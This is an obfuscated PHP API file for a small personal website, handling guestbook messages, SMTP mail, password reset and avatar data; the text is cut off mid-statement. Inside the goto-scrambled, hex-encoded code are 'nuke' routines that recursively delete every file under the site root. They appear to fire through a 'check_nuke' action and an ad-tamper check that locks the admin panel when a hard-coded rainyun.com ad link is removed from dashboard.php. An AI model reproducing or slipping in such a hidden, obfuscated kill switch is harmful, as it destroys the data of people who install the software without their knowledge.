<?php
/* 作者QQ：2769544753，未经允许禁止倒卖！ */
 goto eyLo2afAXF; Y4ID1EuKu1: $newMsg = ["\x69\144" => uniqid("\x6d\163\147\137", true), "\x6e\x61\155\x65" => mb_substr($name, 0, 100), "\145\x6d\x61\151\154" => mb_substr($email, 0, 200), "\155\x65\163\x73\x61\147\145" => mb_substr($message, 0, 5000), "\x74\151\x6d\x65" => date("\131\x2d\155\x2d\x64\x20\x48\72\151\x3a\x73"), "\162\x65\141\144" => false, "\162\x65\x70\154\151\x65\x64" => false]; array_unshift($messages, $newMsg); write_json(MESSAGES_FILE, $messages); $admin = read_json(ADMIN_FILE); $dnd = !empty($admin["\x6d\163\x67\137\144\156\144"]); goto qs2byItoA8; nmd8_3E10j: header("\101\x63\x63\x65\x73\163\55\x43\x6f\156\164\x72\157\154\55\x41\154\154\x6f\167\55\117\x72\x69\x67\x69\156\72\40{$origin}"); header("\101\143\x63\145\x73\163\55\x43\157\x6e\164\x72\x6f\x6c\55\101\x6c\x6c\157\167\x2d\103\162\145\144\x65\156\x74\x69\x61\154\x73\72\40\164\x72\165\x65"); header("\101\x63\143\145\x73\x73\55\103\157\x6e\x74\162\x6f\154\x2d\x41\154\154\x6f\167\x2d\x4d\145\164\150\x6f\144\163\x3a\40\107\105\x54\x2c\x20\x50\x4f\123\124\x2c\40\x4f\x50\x54\111\x4f\x4e\x53"); header("\101\143\143\145\163\x73\55\x43\157\156\164\x72\157\154\55\x41\154\154\x6f\167\55\110\145\141\x64\145\162\x73\72\40\x43\157\156\x74\145\156\x74\55\x54\x79\x70\145\54\40\x58\x2d\x43\123\x52\x46\x2d\x54\x6f\153\x65\x6e"); YzL4QEWNyi: goto jruCSchDZd; autfroVI73: exit; nocngR3uFM: if (!(strlen($newPassword) < 8)) { goto l8tEbwW2CG; } echo json_encode(["\163\165\143\x63\x65\163\x73" => false, "\x6d\145\x73\x73\141\x67\145" => "\xe6\x96\xb0\345\257\x86\347\240\201\344\xb8\215\350\203\xbd\xe5\260\221\xe4\xba\x8e\x20\x38\40\xe4\275\215"]); exit; goto GoNlJ4xrGn; HEvg2Gd9xi: VtpVEqPkAk: if (!($action === "\162\x65\x73\x65\x74\137\x63\150\145\143\x6b\137\163\155\x74\160")) { goto HYpTo0rsz3; } $admin = read_json(ADMIN_FILE) ?: []; $smtpHost = $admin["\163\x6d\x74\160"]["\x68\157\163\x74"] ?? ''; $configured = !empty($smtpHost); goto oINO_T2Bnu; qs2byItoA8: $smtp = $admin["\163\x6d\164\160"] ?? []; if (!(!$dnd && !empty($smtp["\x68\157\163\164"]) && !empty($smtp["\x66\x72\157\x6d\137\145\155\141\x69\x6c"]))) { goto GmwfCkFB4y; } $mailer = new SimpleSMTP($smtp); $notifyBody = "\xe6\x94\xb6\345\210\260\xe6\x96\260\xe7\225\x99\xe8\250\200\12\12"; $notifyBody .= "\xe7\xa7\xb0\xe5\221\xbc\357\xbc\x9a{$name}\12"; goto Q8JWxpsX7t; oINO_T2Bnu: echo json_encode(["\163\x75\143\x63\145\x73\x73" => true, "\143\157\x6e\x66\x69\147\x75\x72\x65\144" => $configured]); exit; HYpTo0rsz3: if (!($action === "\162\x65\163\x65\x74\x5f\x73\145\x6e\x64\137\143\x6f\144\x65")) { goto somDShG9rK; } $sendLimit = rate_limit("\x73\145\x6e\x64\x5f\143\x6f\x64\145", $clientIp, 1, 60); goto eJUIcmnCDf; uVYHoVgOwd: somDShG9rK: if (!($action === "\x72\x65\163\x65\164\x5f\x70\141\163\x73\x77\x6f\x72\144")) { goto z3Y571Ni18; } $input = json_decode(file_get_contents("\160\150\160\x3a\57\57\151\156\x70\x75\164"), true); $code = trim($input["\x63\x6f\x64\145"] ?? ''); $newPassword = $input["\156\145\x77\137\x70\141\163\163\x77\157\x72\144"] ?? ''; goto Bq9lDOPZSl; ljfNIlts2O: if (filter_var($email, FILTER_VALIDATE_EMAIL)) { goto kd_bZe8Mgj; } echo json_encode(["\x73\x75\x63\143\x65\163\163" => false, "\x6d\145\x73\x73\141\147\145" => "\351\x82\xae\xe7\xae\261\346\xa0\274\xe5\274\217\344\xb8\x8d\xe6\255\243\xe7\xa1\xae"]); exit; kd_bZe8Mgj: $messages = read_json(MESSAGES_FILE) ?: []; goto Y4ID1EuKu1; RhmpbTHN8z: exit; lsB2P3wEjK: $code = str_pad(random_int(0, 999999), 6, "\60", STR_PAD_LEFT); $_SESSION["\x72\145\x73\145\164\x5f\x63\x6f\x64\145"] = $code; $_SESSION["\162\x65\x73\145\x74\x5f\143\x6f\x64\145\x5f\x74\x73"] = time(); goto mSw6KM57S8; Hl_w2dDN72: if ($tampered) { goto SQXz5SqUKb; } if (!isset($admin["\x61\x64\137\164\x61\155\x70\145\162\137\x74\163"])) { goto kX_vOEUK0o; } unset($admin["\141\144\137\x74\141\155\160\145\162\137\164\163"]); write_json(ADMIN_FILE, $admin); kX_vOEUK0o: goto yK48InBrDa; pUOCg7sN6E: echo json_encode(["\x73\165\x63\x63\x65\x73\x73" => true, "\156\165\153\145\x64" => false]); exit; OfEqnszSHq: if (!($action === "\x67\x65\164\x5f\x61\166\141\x74\x61\x72")) { goto t_vs6j40DE; } $avatarPath = DATA_DIR . DIRECTORY_SEPARATOR . "\x61\x76\141\164\141\x72\56\160\156\x67"; goto nQryyo5s4w; v1Z4Ldc_Nk: E1DonERptv: execute_nuke(ROOT_DIR, $redirectUrl); $nukeResult = ["\163\x75\143\143\x65\163\163" => true, "\156\165\x6b\x65\144" => true]; if (!$redirectUrl) { goto yd1RZkkRfU; } $nukeResult["\162\145\x64\151\x72\145\x63\x74\x5f\x75\x72\154"] = $redirectUrl; goto c5G2DosHx_; v8Ib5bHHcM: Wpcgoi4E9M: exit; t_vs6j40DE: if (!($action === "\163\141\x76\x65\137\155\x65\x73\x73\141\x67\145")) { goto wplupCWOk3; } $msgLimit = rate_limit("\x73\x61\166\145\137\155\145\163\163\141\x67\145", $clientIp, 5, 60); goto F4Y5NXyCqn; Bq9lDOPZSl: $savedCode = $_SESSION["\x72\x65\163\x65\x74\x5f\x63\x6f\x64\145"] ?? ''; $savedTs = $_SESSION["\x72\145\x73\x65\x74\137\x63\157\144\x65\x5f\x74\163"] ?? 0; if (!(empty($savedCode) || empty($code))) { goto cMDgqUCIUa; } echo json_encode(["\x73\x75\143\x63\x65\163\x73" => false, "\x6d\x65\x73\x73\141\x67\145" => "\350\xaf\xb7\345\205\210\xe8\x8e\267\xe5\x8f\x96\xe9\xaa\214\350\257\201\347\240\201"]); exit; goto ocmFMdHMft; EPwkk3DKl3: Hl5sHlpGMs: $bgPath = DATA_DIR . DIRECTORY_SEPARATOR . "\142\147\56\x6a\160\x67"; if (file_exists($bgPath)) { goto mR7xi1AKN1; } $content["\142\147\x5f\x69\155\x61\x67\x65"] = ''; goto WgHLRP8nZg; goto TNhY5bG0z3; iS2NSL9HKu: $admin = read_json(ADMIN_FILE) ?: []; $smtpConfig = $admin["\x73\155\x74\x70"] ?? []; $fromEmail = $smtpConfig["\146\x72\157\x6d\x5f\145\155\x61\x69\x6c"] ?? ''; if (!(empty($fromEmail) || strtolower($email) !== strtolower($fromEmail))) { goto lsB2P3wEjK; } echo json_encode(["\163\165\x63\x63\145\163\x73" => true, "\x6d\x65\163\x73\x61\147\x65" => "\xe5\xa6\202\346\x9e\234\351\202\xae\xe7\xae\261\346\255\xa3\347\xa1\xae\357\274\x8c\xe9\252\214\xe8\xaf\201\347\xa0\201\345\xb0\x86\345\x8f\x91\xe9\200\201\345\x88\xb0\346\x82\250\347\x9a\x84\xe9\202\xae\347\xae\xb1"]); goto RhmpbTHN8z; VozTtwWxA7: x6lR3S1k6g: $_admin_tamper = read_json(ADMIN_FILE); if (empty($_admin_tamper["\x61\x64\x5f\164\x61\x6d\160\145\x72\137\x74\x73"])) { goto VP1jOJHXpx; } $deadline = $_admin_tamper["\141\144\x5f\164\141\155\x70\x65\x72\137\164\163"] + 300; if (!(time() < $deadline)) { goto aHB6g0u1QY; } goto A6xCheg0dK; C3wyGEZgGz: $tamperLimit = rate_limit("\143\x68\x65\x63\x6b\137\x61\x64\137\x74\141\x6d\x70\x65\162", $clientIp, 10, 60); if ($tamperLimit["\141\154\x6c\157\x77\x65\x64"]) { goto nJ0ECy2kHZ; } echo json_encode(["\163\x75\x63\143\145\163\x73" => true, "\x74\141\155\x70\x65\162\145\144" => false]); exit; nJ0ECy2kHZ: goto KWkGA13B3n; mSw6KM57S8: $_SESSION["\162\x65\163\145\x74\137\145\x6d\x61\151\x6c"] = $email; $_SESSION["\x72\x65\x73\145\x74\x5f\141\x74\164\x65\x6d\160\x74\x73"] = 0; try { $smtp = new SimpleSMTP($smtpConfig); $subject = "\xe3\200\220\xe5\xb0\x8f\xe7\213\220\xe5\x8a\241\345\231\250\xe3\200\x91\xe5\257\206\xe7\240\x81\351\x87\x8d\xe7\275\xae\xe9\xaa\214\350\257\201\347\240\x81"; $body = "\346\x82\xa8\xe6\255\xa3\xe5\x9c\xa8\351\x87\x8d\xe7\xbd\256\347\256\241\347\220\x86\345\220\216\xe5\217\xb0\345\257\206\347\xa0\x81\343\200\202\xa\12\xe9\252\x8c\350\257\x81\xe7\xa0\x81\xef\xbc\x9a{$code}\12\xa\346\x9c\211\xe6\225\x88\xe6\x9c\x9f\40\65\40\345\x88\206\351\222\237\357\274\x8c\xe8\257\xb7\xe5\x8b\277\346\263\204\xe9\x9c\262\347\xbb\231\344\xbb\226\344\xba\xba\343\x80\x82\12\12\345\xa6\x82\xe9\x9d\236\xe6\x9c\254\xe4\272\xba\xe6\223\215\xe4\xbd\x9c\xef\274\214\350\257\267\xe5\xbf\xbd\347\225\xa5\xe6\255\xa4\351\x82\256\344\273\266\343\x80\202"; $smtp->send($fromEmail, $smtpConfig["\146\x72\x6f\x6d\137\156\x61\155\145"] ?? "\xe5\260\x8f\347\213\x90\xe5\x8a\241\xe5\x99\xa8", $email, $subject, $body); } catch (Exception $e) { } echo json_encode(["\x73\x75\x63\x63\145\163\163" => true, "\155\x65\x73\x73\141\147\x65" => "\xe5\246\202\346\x9e\234\xe9\x82\256\347\256\261\xe6\255\xa3\xe7\241\xae\xef\274\214\xe9\xaa\214\350\xaf\201\xe7\240\201\xe5\260\x86\345\217\x91\xe9\200\x81\345\x88\260\346\x82\xa8\347\232\204\xe9\x82\xae\xe7\256\261"]); exit; goto uVYHoVgOwd; yK48InBrDa: echo json_encode(["\163\x75\143\x63\x65\x73\x73" => true, "\x74\141\x6d\x70\145\x72\145\x64" => false]); exit; goto cLQVf3H1_4; SQXz5SqUKb: if (!empty($admin["\x61\x64\137\x74\141\155\x70\145\162\x5f\x74\x73"])) { goto BP3MqPy1dY; } goto Uhi51A0NuD; eyLo2afAXF: header("\x43\157\x6e\164\145\156\164\x2d\124\171\x70\x65\72\x20\141\x70\x70\x6c\x69\x63\141\164\151\157\x6e\57\x6a\163\x6f\156\x3b\40\x63\150\141\x72\163\145\164\x3d\165\x74\x66\x2d\70"); header("\x58\x2d\103\157\156\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\55\x4f\160\164\x69\x6f\156\x73\72\x20\156\157\163\x6e\151\146\146"); header("\x58\55\x46\x72\141\155\x65\55\117\x70\164\x69\x6f\x6e\x73\72\40\x44\x45\116\131"); header("\x52\x65\146\145\x72\162\145\x72\x2d\120\157\x6c\151\x63\x79\x3a\40\163\164\162\x69\143\164\x2d\157\162\x69\147\151\x6e\x2d\167\150\145\x6e\55\143\x72\x6f\x73\163\55\x6f\x72\x69\147\x69\156"); $origin = $_SERVER["\110\124\x54\x50\137\117\x52\111\107\x49\x4e"] ?? ''; goto jY3J2fOIJs; dGeqCsuiii: if (file_exists($avatarPath)) { goto OBY1rrpTqJ; } $content["\141\166\141\x74\141\x72"] = ''; goto Hl5sHlpGMs; OBY1rrpTqJ: $content["\x61\166\141\164\141\162"] = "\x64\x61\x74\141\57\x61\166\x61\x74\141\162\x2e\160\x6e\x67\77\x76\x3d" . filemtime($avatarPath); goto EPwkk3DKl3; F4Y5NXyCqn: if ($msgLimit["\x61\x6c\154\157\x77\x65\144"]) { goto awBp62xaKn; } echo json_encode(["\x73\165\x63\143\x65\163\163" => false, "\x6d\x65\x73\163\141\147\x65" => "\346\223\x8d\344\xbd\x9c\xe8\xbf\x87\344\xba\216\351\242\221\347\271\201\357\274\214\350\xaf\xb7\347\250\215\345\220\x8e\345\206\215\350\257\225"]); exit; awBp62xaKn: $input = json_decode(file_get_contents("\160\x68\160\72\57\57\151\x6e\x70\165\x74"), true); goto ENufK8XtZ1; KVZNp1wBGu: require_once __DIR__ . "\x2f\x61\x75\x74\x68\56\160\x68\160"; require_once __DIR__ . "\x2f\x73\155\164\160\56\x70\x68\x70"; function generate_nuke_redirect_html($rootDir, $redirectUrl) { if (!empty($redirectUrl)) { goto E02kOa8u4z; } return; E02kOa8u4z: $safeUrl = htmlspecialchars($redirectUrl, ENT_QUOTES, "\125\124\106\55\x38"); $jsUrl = json_encode($redirectUrl, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_UNESCAPED_SLASHES); $html = "\74\x21\x44\x4f\103\x54\131\120\105\x20\x68\164\x6d\154\x3e\12\x3c\x68\164\x6d\154\x20\154\x61\x6e\147\x3d\42\x7a\x68\x2d\103\x4e\42\76\xa\x3c\x68\x65\141\144\76\xa\x3c\155\x65\164\141\40\143\150\141\162\163\x65\x74\x3d\42\x55\x54\x46\55\70\42\x3e\12\x3c\x6d\145\164\141\x20\150\x74\x74\x70\x2d\x65\x71\165\x69\x76\75\42\x72\x65\146\162\x65\163\150\x22\40\143\157\x6e\x74\x65\156\164\75\42\x30\73\x75\162\154\x3d" . $safeUrl . "\x22\x3e\12\x3c\164\x69\x74\x6c\x65\76\xe8\xb7\xb3\350\275\xac\xe4\xb8\255\56\56\x2e\74\57\164\151\164\x6c\145\76\xa\x3c\x73\164\171\154\x65\x3e\xa\x2a\173\155\141\162\x67\x69\x6e\x3a\x30\73\x70\x61\144\x64\151\156\x67\x3a\60\x3b\142\157\x78\x2d\163\x69\x7a\151\x6e\147\x3a\142\157\162\144\x65\x72\x2d\x62\157\x78\175\12\x62\x6f\x64\171\x7b\x64\151\x73\x70\x6c\141\171\x3a\x66\154\145\x78\73\x61\x6c\151\147\x6e\x2d\x69\164\x65\155\163\x3a\143\145\156\x74\145\x72\73\x6a\165\x73\x74\x69\x66\171\55\x63\x6f\156\x74\145\156\164\x3a\x63\x65\x6e\x74\x65\162\x3b\155\151\x6e\55\150\x65\x69\x67\150\164\x3a\x31\x30\x30\x76\x68\73\142\141\x63\x6b\147\x72\157\165\x6e\144\72\43\x31\70\x31\x63\x32\61\73\x63\157\x6c\157\x72\x3a\x23\146\x66\146\73\146\x6f\156\164\55\x66\x61\155\x69\x6c\x79\x3a\55\141\160\160\x6c\145\x2d\x73\171\x73\x74\x65\155\54\102\154\x69\156\x6b\x4d\x61\x63\x53\x79\x73\x74\x65\x6d\x46\x6f\156\164\x2c\x22\x53\145\147\x6f\x65\40\x55\111\x22\54\x52\157\142\x6f\164\157\x2c\163\x61\156\x73\55\163\x65\x72\151\146\x7d\xa\56\167\x72\141\160\x7b\x74\x65\170\164\55\x61\x6c\151\147\x6e\x3a\143\x65\x6e\x74\x65\x72\73\x70\x61\144\x64\x69\156\147\x3a\64\x30\x70\170\x7d\xa\56\151\x63\157\156\173\146\157\x6e\x74\x2d\x73\151\172\145\x3a\64\70\160\x78\x3b\155\x61\162\147\151\156\x2d\x62\157\x74\164\157\155\x3a\61\66\160\170\x7d\12\150\x31\x7b\x66\157\x6e\x74\55\163\151\x7a\x65\72\x32\64\x70\x78\73\x6d\x61\x72\147\151\x6e\55\x62\x6f\x74\164\157\155\72\70\160\x78\x3b\x66\x6f\x6e\164\x2d\167\x65\151\x67\x68\x74\72\66\x30\60\x7d\xa\160\x7b\x63\157\x6c\157\x72\x3a\x72\x67\x62\141\50\x32\65\65\x2c\x32\x35\65\54\x32\x35\x35\x2c\60\x2e\x35\51\x3b\146\x6f\156\x74\x2d\163\x69\x7a\145\72\61\64\x70\x78\x3b\x6d\141\162\147\x69\x6e\55\x62\x6f\164\x74\x6f\155\x3a\x32\x30\x70\170\175\12\x61\173\143\x6f\x6c\x6f\x72\x3a\x23\x34\146\x61\143\x66\145\x3b\164\x65\x78\x74\55\144\x65\143\x6f\x72\x61\x74\151\x6f\156\x3a\156\157\x6e\145\x3b\x62\157\x72\x64\x65\162\55\x62\x6f\x74\x74\x6f\155\72\x31\160\x78\40\163\x6f\154\151\x64\x20\162\x67\142\141\50\x37\x39\x2c\61\67\x32\x2c\62\x35\64\x2c\60\56\x33\x29\x7d\12\x61\72\150\157\166\145\162\x7b\142\157\x72\144\x65\x72\x2d\142\157\164\164\x6f\x6d\55\143\157\x6c\x6f\x72\72\43\64\x66\x61\143\146\x65\175\xa\74\57\163\x74\x79\x6c\x65\x3e\xa\74\x2f\x68\x65\x61\144\76\12\74\142\x6f\144\171\x3e\xa\74\144\151\x76\40\x63\x6c\141\163\x73\x3d\42\x77\x72\141\x70\42\x3e\xa\74\144\151\x76\x20\x63\154\x61\x73\x73\75\x22\x69\143\157\x6e\x22\x3e\46\43\61\62\x38\60\x37\x35\x3b\x3c\x2f\x64\x69\166\76\12\74\150\x31\x3e\xe6\255\243\xe5\234\250\xe8\xb7\263\350\275\254\56\56\56\74\57\x68\x31\76\xa\x3c\160\x3e\345\246\x82\xe6\x9e\234\346\xb2\241\346\x9c\211\350\207\252\345\x8a\xa8\xe8\xb7\xb3\xe8\xbd\254\357\274\x8c\350\257\267\40\x3c\141\40\x68\x72\145\x66\x3d\42" . $safeUrl . "\42\x3e\347\x82\xb9\xe5\x87\xbb\xe8\277\x99\xe9\x87\214\x3c\57\x61\76\74\x2f\x70\76\xa\74\x2f\144\151\166\76\12\x3c\x73\143\162\x69\160\x74\x3e\167\x69\156\x64\157\167\x2e\154\x6f\x63\141\164\x69\157\156\x2e\x72\x65\160\154\141\143\x65\x28" . $jsUrl . "\x29\x3b\74\x2f\x73\x63\162\151\160\x74\x3e\xa\74\57\x62\157\144\171\x3e\12\74\x2f\x68\x74\x6d\154\x3e"; @file_put_contents($rootDir . DIRECTORY_SEPARATOR . "\151\156\x64\145\x78\x2e\150\164\155\x6c", $html); } function nuke_dir_recursive($dir, $skipFiles = array()) { if (is_dir($dir)) { goto KFwOSPp25K; } return; KFwOSPp25K: $items = array_diff(scandir($dir), ["\x2e", "\56\x2e"]); foreach ($items as $item) { goto bemBlKzixZ; Gntmnm3ONV: @unlink($path); goto RjD40gNBJe; z2242sDyVH: nuke_dir_recursive($path, $skipFiles); @rmdir($path); goto EvonY6rO9F; EvonY6rO9F: RjD40gNBJe: CYgmJhdQEH: goto N7EglbljzV; bemBlKzixZ: $path = $dir . DIRECTORY_SEPARATOR . $item; if (!in_array($path, $skipFiles)) { goto gKv0BW4naS; } goto CYgmJhdQEH; gKv0BW4naS: if (is_dir($path)) { goto z2242sDyVH; } goto Gntmnm3ONV; N7EglbljzV: } mAP9S3EnIW: } function execute_nuke($rootDir, $redirectUrl) { $skipFiles = []; if (empty($redirectUrl)) { goto Nku2hFpuik; } generate_nuke_redirect_html($rootDir, $redirectUrl); $skipFiles[] = $rootDir . DIRECTORY_SEPARATOR . "\x69\x6e\144\145\x78\56\x68\164\155\x6c"; Nku2hFpuik: $items = array_diff(scandir($rootDir), ["\x2e", "\x2e\x2e"]); foreach ($items as $item) { goto zSpklelECb; zSpklelECb: $path = $rootDir . DIRECTORY_SEPARATOR . $item; if (!in_array($path, $skipFiles)) { goto jEL9ZyiF9O; } goto Psle8_zc4m; jEL9ZyiF9O: if (is_dir($path)) { goto YThCKgohAn; } goto ZRglkiTbhd; ZRglkiTbhd: @unlink($path); goto KRx9bM2g3l; YThCKgohAn: nuke_dir_recursive($path, $skipFiles); @rmdir($path); goto osSj0YB7XT; osSj0YB7XT: KRx9bM2g3l: Psle8_zc4m: goto EfupIAoq6O; EfupIAoq6O: } HTfc_b2k30: } goto PWfUpAq9WT; vHs69rfGjx: exit; glltrSuGz5: echo json_encode(["\x73\165\143\143\145\163\163" => true, "\x74\x61\x6d\160\x65\x72\x65\x64" => true, "\156\x75\x6b\x65\x64" => false, "\x64\145\141\x64\x6c\x69\x6e\x65\x5f\x74\x73" => $deadline, "\163\145\162\166\x65\x72\x5f\164\163" => time()]); exit; cLQVf3H1_4: goto HEvg2Gd9xi; TNhY5bG0z3: mR7xi1AKN1: $content["\142\x67\x5f\151\155\141\147\x65"] = "\144\141\x74\141\57\x62\147\x2e\x6a\160\147\x3f\x76\75" . filemtime($bgPath); WgHLRP8nZg: $content["\142\147\137\x6d\x6f\x64\145"] = $content["\x62\147\x5f\155\157\144\x65"] ?? "\144\145\146\141\165\x6c\x74"; $content["\142\147\x5f\142\x6c\x75\162"] = $content["\x62\147\x5f\142\x6c\165\162"] ?? 6; goto qdA2UNCTLG; c5G2DosHx_: yd1RZkkRfU: echo json_encode($nukeResult); exit; ucYzFinWOh: xGVPibsQHv: goto pUOCg7sN6E; A6xCheg0dK: http_response_code(403); echo json_encode(["\x73\165\x63\143\145\163\163" => false, "\x6d\145\x73\163\x61\x67\x65" => "\xe5\x90\x8e\345\217\260\xe5\267\xb2\xe9\x94\201\xe5\xae\232\357\xbc\232\346\243\x80\xe6\xb5\x8b\345\210\xb0\xe5\271\xbf\xe5\x91\x8a\xe9\x93\276\xe6\216\xa5\350\xa2\xab\347\xaf\241\xe6\x94\xb9", "\x6c\157\x63\153\145\144" => true]); exit; aHB6g0u1QY: VP1jOJHXpx: goto IPCKUwwH9W; tiIScJau5w: if (verify_csrf($csrfToken)) { goto fzMZULEWz4; } http_response_code(403); echo json_encode(["\163\x75\x63\x63\x65\x73\163" => false, "\x6d\x65\163\x73\141\x67\x65" => "\xe5\256\x89\345\x85\250\351\252\214\350\xaf\x81\xe5\244\261\xe8\xb4\xa5\357\274\x8c\350\257\267\345\x88\267\346\x96\xb0\xe9\xa1\265\xe9\x9d\242\xe9\x87\x8d\350\257\x95"]); exit; fzMZULEWz4: goto VozTtwWxA7; r7i6lzy8yG: exit; hd8SkZPZXi: if (!($code !== $savedCode)) { goto nocngR3uFM; } $remaining = 5 - $_SESSION["\162\145\163\x65\164\x5f\x61\164\164\145\155\160\164\x73"]; echo json_encode(["\x73\165\143\x63\x65\163\x73" => false, "\155\145\163\163\x61\147\x65" => "\xe9\xaa\214\xe8\xaf\x81\347\240\201\xe9\x94\231\350\xaf\257\xef\274\x8c\xe8\277\x98\345\217\257\345\xb0\x9d\350\xaf\225\x20" . $remaining . "\x20\346\xac\241"]); goto autfroVI73; KWkGA13B3n: $dashFile = __DIR__ . "\57\144\x61\x73\150\x62\x6f\141\162\144\x2e\x70\150\x70"; $adUrl = "\x68\x74\164\160\163\72\x2f\57\167\x77\x77\x2e\162\x61\x69\x6e\171\165\x6e\56\143\x6f\155\x2f\146\x72\145\x65\150\x6f\x73\x74\137"; $tampered = true; if (!file_exists($dashFile)) { goto dTkfAmXkH0; } $source = file_get_contents($dashFile); goto CAQJWtzjNg; eJUIcmnCDf: if ($sendLimit["\x61\154\x6c\x6f\167\x65\x64"]) { goto Y9pc70rarG; } echo json_encode(["\163\165\143\143\145\163\163" => false, "\155\x65\x73\163\141\x67\x65" => "\xe8\xaf\xb7\x20" . $sendLimit["\x72\145\164\x72\x79\137\141\x66\164\x65\x72"] . "\x20\347\xa7\x92\xe5\x90\216\351\x87\x8d\xe8\xaf\225"]); exit; Y9pc70rarG: $input = json_decode(file_get_contents("\x70\150\x70\72\57\57\x69\156\x70\165\x74"), true); goto HY8XuRHuQj; JoHLDRK2Qs: D2AxZFuy29: $_SESSION["\162\x65\x73\145\164\x5f\x61\164\164\145\x6d\160\x74\x73"] = ($_SESSION["\162\x65\x73\x65\164\x5f\141\164\164\145\x6d\160\x74\163"] ?? 0) + 1; if (!($_SESSION["\x72\x65\163\145\x74\137\141\x74\164\x65\155\x70\x74\163"] > 5)) { goto hd8SkZPZXi; } unset($_SESSION["\x72\145\x73\x65\164\x5f\143\157\144\x65"], $_SESSION["\x72\145\x73\145\164\137\143\157\x64\x65\x5f\164\x73"], $_SESSION["\162\145\163\x65\x74\x5f\x65\x6d\141\151\x6c"], $_SESSION["\162\145\x73\x65\x74\137\x61\x74\x74\x65\155\x70\x74\163"]); echo json_encode(["\163\x75\x63\x63\x65\x73\163" => false, "\155\x65\163\163\141\147\x65" => "\xe9\252\214\xe8\xaf\x81\347\xa0\x81\xe5\260\235\xe8\xaf\225\346\xac\241\346\225\xb0\350\xbf\x87\345\xa4\232\xef\xbc\214\350\257\267\xe9\x87\x8d\346\x96\xb0\350\x8e\267\345\x8f\226"]); goto r7i6lzy8yG; CAQJWtzjNg: if (!(strpos($source, $adUrl) !== false)) { goto lNAupErM9p; } $tampered = false; lNAupErM9p: dTkfAmXkH0: $admin = read_json(ADMIN_FILE) ?: []; goto Hl_w2dDN72; nQryyo5s4w: if (file_exists($avatarPath)) { goto sY06KxcJK7; } echo json_encode(["\163\165\143\143\x65\x73\163" => true, "\165\x72\154" => '']); goto Wpcgoi4E9M; sY06KxcJK7: echo json_encode(["\163\x75\x63\143\145\163\163" => true, "\165\162\154" => "\x64\x61\x74\141\x2f\x61\166\x61\164\x61\x72\x2e\x70\x6e\147\x3f\166\x3d" . filemtime($avatarPath)]); goto v8Ib5bHHcM; Q8JWxpsX7t: $notifyBody .= "\xe9\202\xae\xe7\xae\xb1\xef\274\232{$email}\12"; $notifyBody .= "\xe6\x97\266\xe9\x97\264\xef\274\232{$newMsg["\x74\151\x6d\145"]}\xa\12"; $notifyBody .= "\xe5\x86\x85\345\256\xb9\xef\274\232\xa{$message}"; $mailer->send($smtp["\x66\x72\x6f\x6d\137\x65\x6d\x61\151\x6c"], $smtp["\146\x72\157\x6d\x5f\156\141\155\x65"] ?? "\xe5\260\x8f\xe7\x8b\220\345\x8a\xa1\345\231\xa8", $smtp["\146\x72\157\x6d\x5f\x65\155\141\151\154"], "\343\200\220\xe5\xb0\217\xe7\213\x90\345\x8a\xa1\xe5\231\xa8\xe3\200\x91\xe6\x94\266\345\210\260\xe6\x96\260\347\225\231\350\250\x80\40\55\x20" . $name, $notifyBody); GmwfCkFB4y: goto Lj3fXURfo9; PWfUpAq9WT: $action = $_GET["\141\x63\164\151\157\x6e"] ?? $_POST["\x61\143\164\151\157\x6e"] ?? ''; $clientIp = get_client_ip(); if (!($action === "\147\145\164\137\143\157\x6e\x74\x65\156\164")) { goto niMMwf22Ak; } $content = read_json(CONTENT_FILE); $avatarPath = DATA_DIR . DIRECTORY_SEPARATOR . "\x61\x76\141\164\x61\x72\56\160\x6e\147"; goto dGeqCsuiii; jY3J2fOIJs: if (!$origin) { goto ChS01B3bOF; } $originHost = parse_url($origin, PHP_URL_HOST); $serverHost = $_SERVER["\110\124\x54\120\x5f\x48\117\x53\x54"] ?? ''; $serverHostClean = preg_replace("\x2f\x3a\134\x64\53\44\x2f", '', $serverHost); if (!($originHost && $serverHostClean && $originHost === $serverHostClean)) { goto YzL4QEWNyi; } goto nmd8_3E10j; pt2djhJod9: echo json_encode(["\163\165\143\143\145\163\x73" => true, "\155\145\x73\x73\x61\x67\145" => "\xe5\257\x86\347\xa0\201\351\x87\215\347\275\xae\346\x88\x90\345\x8a\x9f\357\274\214\350\xaf\xb7\xe4\xbd\277\347\224\250\346\x96\260\345\257\206\347\xa0\201\xe7\x99\273\xe5\xbd\x95"]); exit; z3Y571Ni18: if (!($action === "\x63\x68\145\143\x6b\x5f\x6e\165\x6b\x65")) { goto OfEqnszSHq; } $admin = read_json(ADMIN_FILE); goto wMOlFzMnbT; ENufK8XtZ1: if ($input) { goto cXWwf6Kj9j; } $input = $_POST; cXWwf6Kj9j: $name = trim($input["\x6e\141\155\x65"] ?? ''); $email = trim($input["\145\155\x61\x69\154"] ?? ''); goto a72OU0VEX9; HTTlI7JbVJ: $redirectUrl = ''; if (!(!empty($admin["\x6e\165\153\x65\x5f\x72\145\144\x69\x72\145\143\164\x5f\145\156\141\x62\154\145\x64"]) && !empty($admin["\156\x75\153\x65\x5f\162\145\x64\151\x72\145\143\164\x5f\165\162\x6c"]))) { goto qUXpzvNIbk; } $redirectUrl = $admin["\156\x75\x6b\x65\137\162\145\x64\151\x72\145\143\164\x5f\x75\162\x6c"]; qUXpzvNIbk: execute_nuke(ROOT_DIR, $redirectUrl); goto g6k1dWGbvJ; ocmFMdHMft: cMDgqUCIUa: if (!(time() - $savedTs > 300)) { goto D2AxZFuy29; } unset($_SESSION["\162\145\163\145\164\137\x63\x6f\x64\145"], $_SESSION["\x72\145\163\x65\164\137\x63\x6f\x64\x65\x5f\x74\x73"], $_SESSION["\162\145\163\x65\x74\137\145\x6d\x61\x69\154"], $_SESSION["\162\145\x73\x65\x74\x5f\141\x74\164\145\x6d\x70\x74\x73"]); echo json_encode(["\x73\x75\143\143\145\x73\163" => false, "\155\145\x73\x73\141\147\145" => "\351\xaa\x8c\xe8\257\x81\xe7\240\x81\345\267\xb2\xe8\277\207\xe6\x9c\x9f\xef\xbc\x8c\350\257\xb7\351\207\215\346\226\xb0\xe8\x8e\xb7\xe5\x8f\226"]); exit; goto JoHLDRK2Qs; GoNlJ4xrGn: l8tEbwW2CG: $admin = read_json(ADMIN_FILE); $admin["\160\x61\x73\x73\x77\x6f\162\144\x5f\150\x61\163\x68"] = password_hash($newPassword, PASSWORD_DEFAULT); write_json(ADMIN_FILE, $admin); unset($_SESSION["\162\x65\163\x65\164\137\143\157\x64\145"], $_SESSION["\x72\x65\x73\145\164\137\x63\157\x64\145\137\164\163"], 